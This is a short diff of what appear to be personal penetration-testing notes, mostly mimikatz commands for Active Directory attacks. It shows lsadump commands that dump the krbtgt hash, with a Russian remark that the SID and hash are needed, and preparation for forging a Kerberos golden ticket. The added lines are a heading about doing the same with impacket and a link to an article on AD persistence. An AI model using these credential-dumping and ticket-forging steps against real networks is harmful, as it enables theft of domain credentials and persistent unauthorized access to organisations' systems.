@@ -67,6 +67,11 @@ mimikatz # token::elevate (DONT NEED THIS)
 mimikatz # lsadump::lsa /patch (lsadump::lsa /inject /name:krbtgt) ---нужен sid и хеш krbtgt
 
 # Create golden ticket (write to file in this case)
+Golden ticket impacket
+
+https://xakep.ru/2020/04/15/windows-ad-persistence/
+
+
 PS C:\Tools> .\mimikatz.exe
 mimikatz # kerberos::purge
 
